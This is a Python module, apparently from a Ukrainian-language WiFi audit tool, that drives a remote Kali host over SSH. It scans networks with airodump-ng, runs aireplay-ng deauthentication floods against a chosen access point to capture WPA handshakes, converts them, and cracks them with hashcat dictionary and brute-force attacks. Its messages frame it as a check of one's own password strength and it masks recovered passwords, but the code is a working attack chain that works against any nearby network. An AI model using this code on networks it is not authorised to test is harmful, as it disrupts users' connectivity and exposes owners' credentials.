import paramiko
import time
import os
import subprocess
import re
from datetime import datetime
from lib.network_utils import get_networks_correct_form, mask_value
from lib.ssh_utils import remove_and_create_wifi2, remove_and_create_handshake, execute_command_with_sudo, copy_file_via_sftp
from lib.config import config
from lib.network_utils import get_local_path

local_path = get_local_path()

username = config.get("username")
password = config.get("password")
local_handshake_path = os.path.join(local_path, config.get("handshake_folder"))
local_dict_path = os.path.join(local_path, config.get("dict_folder"))
local_hashcat_path = os.path.join(local_path, config.get("hashcat_folder"))

# Global variable to store the file name for handshake capture
current_scan_file_name = None


def list_files(folder):
    """List all files in a folder."""
    return [f for f in os.listdir(folder) if os.path.isfile(os.path.join(folder, f))]


def handshake_wifi_scan(api):
    """
    Scan WiFi networks using airodump-ng for handshake capture.
    Returns list of networks with: ssid, bssid, channel, encryption, cipher
    """
    global current_scan_file_name
    
    host = config.get("host")
    networks = []
    
    api.dispatch_event('message', {'message': '[Handshake]: Починаємо сканування...', 'type': 'info'})
    
    # Generate unique file name based on timestamp
    current_scan_file_name = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
    file_path = f"/home/kali/wifi2/{current_scan_file_name}"
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(host, username=username, password=password)
        
        # Prepare directories
        remove_and_create_wifi2(ssh, password)
        remove_and_create_handshake(ssh, password)
        
        api.dispatch_event('message', {'message': '[Handshake]: Переводимо wlan0 в режим моніторингу...', 'type': 'info'})
        api.dispatch_event('handshake-scan-progress', {'status': 'monitor_mode', 'progress': 10})
        
        print("Переводимо wlan0 в режим моніторингу...")
        
        # Stop conflicting processes
        ssh.exec_command(f'echo {password} | sudo -S airmon-ng check kill', get_pty=True)
        time.sleep(2)
        
        # Start monitor mode
        ssh.exec_command(f'echo {password} | sudo -S airmon-ng start wlan0', get_pty=True)
        time.sleep(5)
        
        api.dispatch_event('message', {'message': '[Handshake]: Запускаємо airodump-ng для сканування мереж...', 'type': 'info'})
        api.dispatch_event('handshake-scan-progress', {'status': 'scanning', 'progress': 30})
        
        print("Запускаємо airodump-ng для сканування мереж...")
        
        # Start airodump-ng in background via screen
        ssh.exec_command(f'echo {password} | sudo -S screen -dm airodump-ng -w {file_path} wlan0mon', get_pty=True)
        time.sleep(10)
        
        api.dispatch_event('handshake-scan-progress', {'status': 'collecting', 'progress': 50})
        
        # Additional delay for data collection
        time.sleep(15)
        
        api.dispatch_event('handshake-scan-progress', {'status': 'reading', 'progress': 70})
        
        # Read the CSV file
        csv_file_path = f"{file_path}-01.csv"
        print(f"Читаємо файл {csv_file_path}...")
        
        api.dispatch_event('message', {'message': f'[Handshake]: Читаємо файл {csv_file_path}...', 'type': 'info'})
        
        stdin, stdout, stderr = ssh.exec_command(f'cat {csv_file_path}', get_pty=True)
        time.sleep(2)
        
        # Read file contents
        csv_output = stdout.read().decode()
        csv_errors = stderr.read().decode()
        
        if csv_output:
            print(f"Зчитаний вміст файлу:\n{csv_output}\n")
            
            # Manual text processing
            lines = csv_output.strip().splitlines()
            headers = [header.strip() for header in lines[0].split(',')]
            print("Заголовки CSV-файлу:", headers)
            
            # Define column indices
            try:
                index_bssid = headers.index("BSSID")
                index_protocol = headers.index("Privacy")
                index_encryption = headers.index("Cipher")
                index_ch = headers.index("channel")
                index_essid = headers.index("ESSID")
                
                print(f"{'BSSID':<20} {'Ch':<5} {'Протокол':<15} {'Шифрування':<15} {'ESSID':<30}")
                print("=" * 85)
                
                # Process each row
                for row in lines[1:]:
                    columns = [col.strip() for col in row.split(',')]
                    
                    # Check if row has sufficient columns
                    if len(columns) > max(index_bssid, index_protocol, index_encryption, index_ch, index_essid) and len(columns[index_essid]) > 0:
                        bssid = columns[index_bssid]
                        protocol = columns[index_protocol]
                        encryption = columns[index_encryption]
                        ch = columns[index_ch]
                        essid = columns[index_essid]
                        
                        print(f"{bssid:<20} {ch:<5} {protocol:<15} {encryption:<15} {essid:<30}")
                        
                        # Create network object
                        network = {
                            'ssid': essid,
                            'bssid': bssid,
                            'channel': ch,
                            'encryption': protocol,
                            'cipher': encryption
                        }
                        networks.append(network)
                        
                        # Dispatch event for each found network
                        api.dispatch_event('handshake-network-found', {
                            'network': network,
                            'count': get_networks_correct_form(len(networks))
                        })
                    else:
                        print("Пропускаємо рядок, який не містить усіх необхідних даних:", columns)
                
            except ValueError as ve:
                print(f"Помилка: {ve}. Перевірте заголовки CSV-файлу.")
                api.dispatch_event('message', {'message': f'[Handshake]: Помилка парсингу CSV: {ve}', 'type': 'error'})
        
        if csv_errors:
            print(f"Помилка при читанні файлу: {csv_errors}")
            api.dispatch_event('message', {'message': f'[Handshake]: Помилка читання файлу: {csv_errors}', 'type': 'error'})
        
        api.dispatch_event('handshake-scan-progress', {'status': 'complete', 'progress': 100})
        api.dispatch_event('message', {'message': f'[Handshake]: Сканування завершено. {get_networks_correct_form(len(networks))}', 'type': 'success'})
        
    except Exception as e:
        print(f"Виникла помилка: {e}")
        api.dispatch_event('message', {'message': f'[Handshake]: Виникла помилка: {e}', 'type': 'error'})
    
    finally:
        print("\nЗупинка моніторингового режиму...")
        api.dispatch_event('message', {'message': '[Handshake]: Зупинка моніторингового режиму...', 'type': 'info'})
        
        stdin, stdout, stderr = ssh.exec_command(f'echo {password} | sudo -S airmon-ng stop wlan0mon', get_pty=True)
        stdout.channel.recv_exit_status()
        output_stop = stdout.read().decode()
        errors_stop = stderr.read().decode()
        print(f"Результат зупинки моніторингового режиму:\n{output_stop}")
        if errors_stop:
            print(f"Помилка: {errors_stop}")
        
        ssh.close()
        print("Підключення до SSH закрито.")
    
    return networks


def handshake_capture(api, network, method='deauth', packets_per_sec=10, duration=70):
    """
    Capture handshake for a specific network.
    
    Args:
        api: API instance for dispatching events
        network: Network dict with bssid, channel, ssid
        method: Deauth method ('deauth', 'disassoc', 'both')
        packets_per_sec: Packets per second for deauth attack
        duration: Duration in seconds for capture
    
    Returns:
        dict with success, captured, file keys
    """
    global current_scan_file_name
    
    host = config.get("host")
    
    bssid = network.get('bssid')
    channel = network.get('channel')
    
    # Use the file name from scan or generate new one
    if not current_scan_file_name:
        current_scan_file_name = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
    
    file_name = current_scan_file_name
    remote_cap_file = f"/home/kali/handshake/{file_name}-01.cap"
    remote_hccapx_folder = "/home/kali/convert"
    remote_hccapx_file = f"{remote_hccapx_folder}/{file_name}.hccapx"
    
    result = {
        'success': False,
        'captured': False,
        'file': None,
        'message': ''
    }
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        ssh.connect(host, username=username, password=password)
        
        print(f"BSSID: {bssid}, Channel: {channel}, Cap file: {remote_cap_file}")
        
        # Ensure directories exist
        api.dispatch_event('message', {'message': '[Handshake]: Підготовка папок...', 'type': 'info'})
        api.dispatch_event('handshake-capture-progress', {'status': 'preparing', 'progress': 5, 'elapsed': 0, 'total': duration})
        
        execute_command_with_sudo(ssh, "mkdir -p /home/kali/handshake /home/kali/convert", password)
        
        # Check if wlan0mon is active
        api.dispatch_event('message', {'message': '[Handshake]: Перевіряємо режим моніторингу...', 'type': 'info'})
        api.dispatch_event('handshake-capture-progress', {'status': 'checking_monitor', 'progress': 10, 'elapsed': 0, 'total': duration})
        
        stdin, stdout, stderr = ssh.exec_command("iwconfig wlan0mon")
        if "Mode:Monitor" not in stdout.read().decode():
            api.dispatch_event('message', {'message': '[Handshake]: Переводимо wlan0 в режим моніторингу...', 'type': 'info'})
            execute_command_with_sudo(ssh, "airmon-ng start wlan0", password)
            time.sleep(5)
        
        # Start airodump-ng for handshake capture
        api.dispatch_event('message', {'message': '[Handshake]: Запускаємо airodump-ng для збору хендшейку...', 'type': 'info'})
        api.dispatch_event('handshake-capture-progress', {'status': 'starting_capture', 'progress': 15, 'elapsed': 0, 'total': duration})
        
        airodump_command = (
            f"sudo airodump-ng -w /home/kali/handshake/{file_name} "
            f"-c {channel} --bssid {bssid} wlan0mon > /dev/null 2>&1 &"
        )
        print(f"Запускаємо airodump-ng: {airodump_command}")
        ssh.exec_command(airodump_command)
        time.sleep(5)
        
        # Start deauth attack
        api.dispatch_event('message', {'message': '[Handshake]: Запускаємо атаку деавтентифікації...', 'type': 'info'})
        api.dispatch_event('handshake-capture-progress', {'status': 'deauth_attack', 'progress': 20, 'elapsed': 0, 'total': duration})
        
        # Select deauth method
        if method == 'deauth' or method == 'both':
            aireplay_command = f"sudo aireplay-ng --deauth 0 -a {bssid} wlan0mon > /dev/null 2>&1 &"
            print(f"Запускаємо атаку деавтентифікації: {aireplay_command}")
            ssh.exec_command(aireplay_command)
        
        if method == 'disassoc' or method == 'both':
            disassoc_command = f"sudo aireplay-ng --fakeauth 0 -a {bssid} wlan0mon > /dev/null 2>&1 &"
            print(f"Запускаємо атаку від'єднання: {disassoc_command}")
            ssh.exec_command(disassoc_command)
        
        # Wait for handshake capture with progress updates
        api.dispatch_event('message', {'message': f'[Handshake]: Очікуємо {duration} секунд для збору хендшейку...', 'type': 'info'})
        
        start_time = time.time()
        while True:
            elapsed = int(time.time() - start_time)
            if elapsed >= duration:
                break
            
            progress = 20 + int((elapsed / duration) * 60)  # Progress from 20% to 80%
            api.dispatch_event('handshake-capture-progress', {
                'status': 'capturing',
                'progress': progress,
                'elapsed': elapsed,
                'total': duration,
                'packets_sent': packets_per_sec * elapsed
            })
            time.sleep(5)
        
        # Stop processes
        api.dispatch_event('message', {'message': '[Handshake]: Зупиняємо процеси...', 'type': 'info'})
        api.dispatch_event('handshake-capture-progress', {'status': 'stopping', 'progress': 85, 'elapsed': duration, 'total': duration})
        
        execute_command_with_sudo(ssh, "killall -q airodump-ng", password)
        execute_command_with_sudo(ssh, "killall -q aireplay-ng", password)
        
        # Convert CAP to HCCAPX
        api.dispatch_event('message', {'message': '[Handshake]: Конвертуємо CAP у HCCAPX...', 'type': 'info'})
        api.dispatch_event('handshake-capture-progress', {'status': 'converting', 'progress': 90, 'elapsed': duration, 'total': duration})
        
        stdout_conv, stderr_conv = execute_command_with_sudo(
            ssh, f"hcxpcapngtool -o {remote_hccapx_file} {remote_cap_file}", password
        )
        
        if stderr_conv and "error" in stderr_conv.lower():
            print(f"Помилка hcxpcapngtool: {stderr_conv}")
            api.dispatch_event('message', {'message': f'[Handshake]: Помилка конвертації: {stderr_conv}', 'type': 'error'})
        else:
            print("Конвертація успішна.")
        
        # Check if HCCAPX file was created
        api.dispatch_event('handshake-capture-progress', {'status': 'checking', 'progress': 95, 'elapsed': duration, 'total': duration})
        
        stdin, stdout, stderr = ssh.exec_command(f"ls {remote_hccapx_file}")
        if stdout.read().strip():
            print(f"HCCAPX-файл знайдено: {remote_hccapx_file}")
            api.dispatch_event('message', {'message': f'[Handshake]: HCCAPX-файл знайдено!', 'type': 'success'})
            
            # Copy file to local machine
            api.dispatch_event('message', {'message': '[Handshake]: Копіюємо файл на локальний комп\'ютер...', 'type': 'info'})
            copy_file_via_sftp(remote_hccapx_file, local_handshake_path, host, username, password)
            
            local_file = os.path.join(local_handshake_path, f"{file_name}.hccapx")
            result = {
                'success': True,
                'captured': True,
                'file': f"{file_name}.hccapx",
                'message': 'Handshake успішно перехоплено'
            }
        else:
            print("Файл HCCAPX не створено.")
            api.dispatch_event('message', {'message': '[Handshake]: Файл HCCAPX не створено. Спробуйте ще раз.', 'type': 'warning'})
            result = {
                'success': True,
                'captured': False,
                'file': None,
                'message': 'Не вдалося перехопити handshake. Спробуйте збільшити тривалість.'
            }
        
        api.dispatch_event('handshake-capture-progress', {'status': 'complete', 'progress': 100, 'elapsed': duration, 'total': duration})
        
    except Exception as e:
        print(f"Виникла помилка: {e}")
        api.dispatch_event('message', {'message': f'[Handshake]: Виникла помилка: {e}', 'type': 'error'})
        result['message'] = str(e)
    
    finally:
        print("\nЗупинка моніторингового режиму...")
        api.dispatch_event('message', {'message': '[Handshake]: Зупинка моніторингового режиму...', 'type': 'info'})
        
        stdin, stdout, stderr = ssh.exec_command(f'echo {password} | sudo -S airmon-ng stop wlan0mon', get_pty=True)
        stdout.channel.recv_exit_status()
        output_stop = stdout.read().decode()
        errors_stop = stderr.read().decode()
        print(f"Результат зупинки моніторингового режиму:\n{output_stop}")
        if errors_stop:
            print(f"Помилка: {errors_stop}")
        
        ssh.close()
        print("Підключення до SSH закрито.")
    
    return result


def handshake_decrypt_dictionary(api, handshake_file, dict_file):
    """
    Decrypt handshake using dictionary attack with hashcat.
    
    Args:
        api: API instance for dispatching events
        handshake_file: Name of the handshake file (in local_handshake_path)
        dict_file: Name of the dictionary file (in local_dict_path)
    
    Returns:
        dict with success, cracked, password keys
    """
    handshake_path = os.path.join(local_handshake_path, handshake_file)
    dict_path = os.path.join(local_dict_path, dict_file)
    
    result = {
        'success': False,
        'cracked': False,
        'password': None,
        'message': ''
    }
    
    # Build hashcat command
    command = f'hashcat -m 22000 -a 0 "{handshake_path}" "{dict_path}"'
    print(f"\nЗапуск команди:\n{command}")
    
    api.dispatch_event('message', {'message': '[Handshake]: Починаємо розшифрування...', 'type': 'info'})
    api.dispatch_event('handshake-decrypt-progress', {'status': 'starting', 'progress': 0})
    
    try:
        # Run hashcat
        process = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = process.stdout
        print(output.strip())
        
        api.dispatch_event('handshake-decrypt-progress', {'status': 'analyzing', 'progress': 90})
        
        # Pattern for successful decryption
        pattern_success = r"Status\.{11}: Cracked"
        pattern_fail = r"Status\.{11}: Exhausted"
        pattern_password = r"^Candidates\.#1.*?->\s*(\S+)$"
        
        match_success = re.search(pattern_success, output)
        if match_success:
            message_success = "Ваша мережа використовує слабкий пароль.\nРадимо вам змінити пароль та змінити протокол шифрування на новішу версію."
            
            match_password = re.search(pattern_password, output, re.MULTILINE)
            password_found = None
            if match_password:
                password_found = match_password.group(1)
                message_success += f"\n\nПароль: {mask_value(password_found)}"
            
            print(message_success)
            api.dispatch_event('message', {'message': f'[Handshake]: {message_success}', 'type': 'success'})
            
            result = {
                'success': True,
                'cracked': True,
                'password': mask_value(password_found) if password_found else None,
                'message': message_success
            }
        else:
            match_fail = re.search(pattern_fail, output)
            if match_fail:
                message_fail = "Чудово! У вас надійний пароль."
                print(message_fail)
                api.dispatch_event('message', {'message': f'[Handshake]: {message_fail}', 'type': 'info'})
                
                result = {
                    'success': True,
                    'cracked': False,
                    'password': None,
                    'message': message_fail
                }
            else:
                api.dispatch_event('message', {'message': '[Handshake]: Помилка розшифрування', 'type': 'error'})
                result = {
                    'success': False,
                    'cracked': False,
                    'password': None,
                    'message': 'Помилка розшифрування'
                }
        
        api.dispatch_event('handshake-decrypt-progress', {'status': 'complete', 'progress': 100})
        
    except Exception as e:
        print(f"Виникла помилка: {e}")
        api.dispatch_event('message', {'message': f'[Handshake]: Виникла помилка: {e}', 'type': 'error'})
        result['message'] = str(e)
    
    return result


def handshake_decrypt_bruteforce(api, handshake_file, password_length=8, use_lowercase=False, 
                                  use_uppercase=False, use_digits=True, use_special=False):
    """
    Decrypt handshake using brute force attack with hashcat.
    
    Args:
        api: API instance for dispatching events
        handshake_file: Name of the handshake file
        password_length: Length of password to try
        use_lowercase: Include lowercase letters (a-z)
        use_uppercase: Include uppercase letters (A-Z)
        use_digits: Include digits (0-9)
        use_special: Include special characters
    
    Returns:
        dict with success, cracked, password keys
    """
    handshake_path = os.path.join(local_handshake_path, handshake_file)
    
    result = {
        'success': False,
        'cracked': False,
        'password': None,
        'message': ''
    }
    
    # Build mask based on selected character sets
    charset_parts = []
    if use_lowercase:
        charset_parts.append('?l')
    if use_uppercase:
        charset_parts.append('?u')
    if use_digits:
        charset_parts.append('?d')
    if use_special:
        charset_parts.append('?s')
    
    # Default to all characters if nothing selected
    if not charset_parts:
        mask_char = '?a'
        mask = mask_char * password_length
    elif len(charset_parts) == 1:
        mask_char = charset_parts[0]
        mask = mask_char * password_length
    else:
        # Custom charset
        charset = ''.join(charset_parts)
        mask = f"-1 {charset} " + '?1' * password_length
    
    # Build hashcat command
    command = f'hashcat -m 22000 -a 3 "{handshake_path}" {mask}'
    print(f"\nЗапуск команди:\n{command}")
    
    api.dispatch_event('message', {'message': '[Handshake]: Починаємо brute force розшифрування...', 'type': 'info'})
    api.dispatch_event('handshake-decrypt-progress', {'status': 'starting', 'progress': 0})
    
    try:
        # Run hashcat
        process = subprocess.run(command, shell=True, capture_output=True, text=True)
        output = process.stdout
        print(output.strip())
        
        api.dispatch_event('handshake-decrypt-progress', {'status': 'analyzing', 'progress': 90})
        
        # Pattern for successful decryption
        pattern_success = r"Status\.{11}: Cracked"
        pattern_fail = r"Status\.{11}: Exhausted"
        pattern_password = r"^Candidates\.#1.*?->\s*(\S+)$"
        
        match_success = re.search(pattern_success, output)
        if match_success:
            message_success = "Ваша мережа використовує слабкий пароль.\nРадимо вам змінити пароль."
            
            match_password = re.search(pattern_password, output, re.MULTILINE)
            password_found = None
            if match_password:
                password_found = match_password.group(1)
                message_success += f"\n\nПароль: {mask_value(password_found)}"
            
            print(message_success)
            api.dispatch_event('message', {'message': f'[Handshake]: {message_success}', 'type': 'success'})
            
            result = {
                'success': True,
                'cracked': True,
                'password': mask_value(password_found) if password_found else None,
                'message': message_success
            }
        else:
            match_fail = re.search(pattern_fail, output)
            if match_fail:
                message_fail = "Чудово! У вас надійний пароль."
                print(message_fail)
                api.dispatch_event('message', {'message': f'[Handshake]: {message_fail}', 'type': 'info'})
                
                result = {
                    'success': True,
                    'cracked': False,
                    'password': None,
                    'message': message_fail
                }
            else:
                api.dispatch_event('message', {'message': '[Handshake]: Помилка розшифрування', 'type': 'error'})
                result = {
                    'success': False,
                    'cracked': False,
                    'password': None,
                    'message': 'Помилка розшифрування'
                }
        
        api.dispatch_event('handshake-decrypt-progress', {'status': 'complete', 'progress': 100})
        
    except Exception as e:
        print(f"Виникла помилка: {e}")
        api.dispatch_event('message', {'message': f'[Handshake]: Виникла помилка: {e}', 'type': 'error'})
        result['message'] = str(e)
    
    return result
